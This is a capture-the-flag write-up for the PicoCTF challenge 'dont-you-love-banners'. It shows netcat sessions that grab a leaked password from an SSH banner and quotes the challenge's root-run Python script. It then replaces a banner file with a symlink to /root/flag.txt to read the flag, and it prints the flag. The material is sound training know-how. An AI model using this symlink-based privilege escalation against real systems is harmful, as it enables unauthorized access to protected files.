+++
author = 'Alex Domnit'
title = 'dont-you-love-banners'
date = 2024-10-24T15:32:01+03:00
draft = false
description = "Writeup"
tags = [
    "CTF",
    "Completed",
]
categories = [
    "PicoCTF",
    "General skills",
]
toc = false
+++

### Level Description

Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 55626. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 59416. From the above information abuse the machine and find the flag in the /root directory.

### Doc

[Symlinks.](https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/)

### Solution

Logging in on the nc connection provided hits you with a password request.

```
03:35:14 archie@Archie ~ → nc tethys.picoctf.net 52675
*************************************
**************WELCOME****************
*************************************

what is the password?
```

The next logical step is to investigate the netcat in the header in order to get the "leaked" information.

```
03:36:19 archie@Archie ~ → nc tethys.picoctf.net 65227
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

That gives you the password and next, you are prompted with some general questions that you can find the answers to on google : 

```
03:38:08 archie@Archie ~ → nc tethys.picoctf.net 52675
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
Defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```

Now, you are in the machine. Let`s investigate the pwd.

```
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
```

This didn`t help very much but navigationg to the root directory will.

```
player@challenge:/$ cd root
cd root
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
```

**script.py :**

```
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

The interesting part of all of this is the fact that the script reads the banner file in your home directory using elevated priviledges. This basically boils down to the fact that if you could somehow change the file from banner to flag.txt you could in theory get the password for the next level. Here is where symlinks come in handy. They are basically the same thing as a shortcut on windows. The taught process is that we remove the file, create a link to the file that we actually want to read then run the script.

```
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ls
ls
text
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls
ls
banner  text
```

Now, when you log into the same instance once again, the script will execute and hopefully spit out the password.

**Next login :**

```
03:49:07 archie@Archie ~ → nc tethys.picoctf.net 52675
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
```
